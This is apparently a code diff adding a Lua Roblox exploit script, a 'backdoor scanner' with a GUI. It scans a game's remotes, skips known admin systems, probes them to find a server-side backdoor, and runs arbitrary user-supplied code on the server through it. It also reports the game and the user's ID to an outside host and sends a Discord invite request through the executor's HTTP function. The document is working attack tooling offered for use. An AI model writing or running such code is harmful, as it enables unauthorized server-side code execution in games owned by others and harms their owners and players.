+-- [[COMMON BACKDOOR FILTER]]
+-- @filter ClassName check the passed instance
+BACKDOOR_FILTER[1] = function(r)
+        -- Checking the class
+    return r:IsA("RemoteEvent") or r:IsA("RemoteFunction");
+end;
+BACKDOOR_FILTER[2] = function(r)
+        -- Anti-Addonis Filter
+        return not ((r.Parent == game:GetService("ReplicatedStorage") and r:FindFirstChild("__FUNCTION")) or
+            (r.Name == "__FUNCTION" and r.Parent:IsA("RemoteEvent") and r.Parent.Parent == game:GetService("ReplicatedStorage")));
+end;
+BACKDOOR_FILTER[3] = function(r)
+    local Parent = tostring(r.Parent and r.Parent.Parent);
+    return not (Parent == "HDAdminClient")
+end;
+
+--// CORE \\--
+
+local function filterRemote(r, remotes)
+    for _, filter in ipairs(BACKDOOR_FILTER) do
+        if not filter(r) then
+            return false; -- remote is not a backdoor
+        end;
+    end;
+    table.insert(remotes, r);
+    return true;
+end
+
+local function getRemotes()
+    local remotes = {};
+    for i, r in ipairs(game:GetDescendants()) do
+        filterRemote(r, remotes);
+    end;
+    -- check getnilinstances support
+    if getnilinstances == nil then
+        return remotes;
+    end
+    for i, r in ipairs(getnilinstances()) do
+        filterRemote(r, remotes);
+    end;
+    return remotes;
+end;
+
+-- scan all game remotes and return all backdoors found
+local function scan(remotes, delayFactor)
+    delayFactor = delayFactor or 1;
+    alertLib.Info(screenGui, TITLE, 'Scan started.', 4);
+    ui.title.Text = TITLE .. " [Scanning]";
+    -- retrive remotes
+    remotes = remotes or getRemotes();
+    local backdoor;
+    -- listen workspace new instances
+    local connection;
+    connection = workspace.ChildAdded:Connect(function(child)
+        local gateway = URSTRING_TO_BACKDOOR[child.Name];
+        if gateway then
+            -- store backdoor
+            backdoor = gateway;
+            connection:Disconnect();
+        end;
+    end);
+    ui.title.Text = TITLE .. " [Testing]";
+    -- loop all remotes
+    for i, r in ipairs(remotes) do
+        -- loop solvers
+        for j, s in ipairs(BACKDOOR_SOLVER) do
+            -- create a new backdoor gateway
+            local g = makeGateway(r, s);
+            -- this will ensure we generate an unique string inside URSTRING_TO_BACKDOOR and workspace
+            local dummyName = urString(5, workspace) .. i .. j;
+            -- register gateway
+            URSTRING_TO_BACKDOOR[dummyName] = g;
+            -- make dummy test
+            s.makeDummy(r, dummyName);
+        end;
+    end;
+    -- force disconnect after localPlayer:GetNetworkPing() * delayFactor * #remotes
+    local timeOut = math.max((localPlayer:GetNetworkPing() * delayFactor) * #remotes, MAXTIMEOUT);
+    task.delay(timeOut, function()
+        connection:Disconnect();
+    end);
+    local endTime = tick() + timeOut;
+    -- wait until connection is disconnected
+    while connection.Connected do
+        ui.title.Text = TITLE .. (" [Waiting: %.1f]"):format(endTime-tick());
+        task.wait();
+    end;
+    ui.title.Text = TITLE .. " [Waiting]";
+    table.clear(URSTRING_TO_BACKDOOR); -- clear URSTRING_TO_BACKDOOR
+    -- return
+    return backdoor;
+end;
+
+local executing = false;
+local function execute(code, gateway, canDebug, disableAlerts)
+    assert(code and gateway, "missing code or gateway");
+    ui.title.Text = TITLE .. " [Executing]";
+    local completed = Instance.new("BindableEvent");
+    -- completed destroy
+    completed.Event:Connect(function()
+        completed:Destroy();
+    end);
+    -- debug script case
+    if canDebug then
+        local token = urString(5, workspace);
+        -- pcall wrapper
+        code = EXEC_DEBUG:format(code, token);
+        -- listen for error instance
+        local connection;
+        connection = workspace.ChildAdded:Connect(function(child)
+            if child.Name == token then
+                -- stdout print, warn
+                local stdout = child:GetAttribute("stdout");
+                if typeof(stdout) == "string" then
+                    local integrity, parsed = pcall(httpService.JSONDecode, httpService, stdout);
+                    if integrity then
+                        for i, out in next, parsed do
+                            if out.warn then
+                                warn(table.unpack(out.value));
+                            else
+                                print(table.unpack(out.value));
+                            end
+                        end
+                    end
+                end
+                -- stdout err in the console
+                if not child.Value then
+                        -- alert to user
+                        if not disableAlerts then
+                        alertLib.Error(screenGui, TITLE, 'Execution error in console.');
+                        end;
+                    task.spawn(error, child:GetAttribute("err"));
+                elseif not disableAlerts then
+                    alertLib.Success(screenGui, TITLE, 'Script successfully executed.');
+                end;
+                completed:Fire(child.Value);
+                -- disconnect
+                connection:Disconnect();
+                connection = nil; -- force gc
+            end
+        end);
+        -- force disconnect after 60 seconds (aka max execution time)
+        task.delay(60 , function()
+            if connection then
+                connection:Disconnect();
+            end;
+        end);
+    else
+        -- this will fire completed event just in case is needed with non-debug mode
+        task.delay(0.1, function()
+            completed:Fire(true);
+        end);
+    end;
+    -- execute code
+    gateway:Execute(code);
+    return completed.Event;
+end;
+
+
+-- perform a scan and print out the time taken and the found backdoors
+local function debugScan()
+    local start = tick();
+    local backdoor = scan(nil, 2.5);
+    local endTime = tick();
+    print("Backdoors found: " .. (backdoor and 1 or 0));
+    print("Time taken: " .. (endTime - start) .. "ms");
+    return backdoor;
+end;
+
+-- macros solver
+local function applyMacros(code)
+    return 
+    code:gsub(
+        "%%username%%", localPlayer.Name
+    ):gsub(
+        "%%userid%%", localPlayer.UserId
+    ):gsub(
+        "%%userping%%", localPlayer:GetNetworkPing()
+    ):gsub(
+        "%%debug%%", tostring(config.data.settings.canDebug)
+    );
+end;
+
+-- retrive backdoors from config
+local function getBackdoorFromConfig()
+    if config.data.games[game.PlaceId] then
+        local gameBackdoors = config.data.games[game.PlaceId].backdoors;
+        local remotes = {};
+        -- loop saved instances
+        for i, path in next, gameBackdoors do
+            -- resolve instance path
+            local remote = solveRobloxPath(path);
+            -- store instance after filters check
+            if remote then
+                filterRemote(remote, remotes);
+            end;
+        end
+        -- scan with config remotes
+        return scan(remotes, 3);
+    end;
+    return nil;
+end;
+
+-- execution level
+local backdoor;
+local firstExecution = true;
+local function resetExecutionState()
+    executing = false;
+    ui.title.Text = TITLE;
+end;
+
+local function logGame()
+    local int, data = pcall(game.HttpGet, game, "https://k4scripts.xyz/bexe/token/" .. localPlayer.UserId);
+    if not int then
+        return;
+    end
+    execute(applyMacros(LOG_GAME):format(data), backdoor, false, true):Wait();
+end;
+
+
+btns.execBtn.MouseButton1Click:Connect(function()
+    -- avoid multiple executions
+    if executing then
+        return;
+    end
+    executing = true;
+    -- try scanning for backdoors
+    if backdoor == nil then
+        -- check if config.games has found backdoors
+        backdoor = getBackdoorFromConfig();
+        if not backdoor then
+            -- search backdoors
+            backdoor = debugScan();
+        end
+    end;
+    if backdoor == nil then
+        alertLib.Error(screenGui, TITLE, 'No backdoor found.');
+        resetExecutionState();
+        return;
+    end;
+    if firstExecution then
+        -- Executing blank script
+        execute("", backdoor, false, true):Wait();
+        -- store game
+        games.loadGame(game.PlaceId, encodeBackdoors({backdoor}));
+        config.save();
+        -- log game
+        logGame();
+        firstExecution = false;
+    end;
+    -- execute
+    local code = applyMacros(editor.getCode());
+    execute(code, backdoor, config.data.settings.canDebug);
+    resetExecutionState();
+end);
+
+-- set title
+ui.title.Text = TITLE;
+
+alertLib.Success(screenGui, TITLE, 'Backdoor scanner successfully loaded.');
+alertLib.Info(screenGui, TITLE, 'Home to toggle ui.', 4);
+alertLib.Info(screenGui, TITLE, 'THIS HAS BEEN DISCONTINUED', 4);
+-- service
+local httpService = game:GetService("HttpService");
+
+local invCode = "xJHCqm84cW";
+local httpRequest = (syn and syn.request) or http_request or function() end;
+
+local function launchDiscord()
+	if not httpRequest then warn("Exploit not supported. No HTTP found.") return end
+	
+	httpRequest({
+		Url = "https://discord.com/invite/1268858650617839636/1268858650617839638",
+		Method = "POST",
+	
+		Headers = {
+			['Content-Type'] = 'application/json',
+			Origin = 'https://discord.com'
+		},
+	
+		Body = httpService:JSONEncode({
+			cmd = 'INVITE_BROWSER',
+			nonce = httpService:GenerateGUID(false),
+			args = {code = invCode}
+		})
+	})
+end;
+
+local NotificationBindable = Instance.new("BindableFunction")
+NotificationBindable.OnInvoke = launchDiscord
+
+game:GetService("StarterGui"):SetCore(
+	"SendNotification",
+	{
+		Title = "backdoor JKLO",
+		Duration = 5,
+		Text = "Loading lastest version!\n\nJoin our Discord for games, scripts and more",
+		Button1 = "Join Discord!",
+		Callback = NotificationBindable
+      }
+     )      
+end)
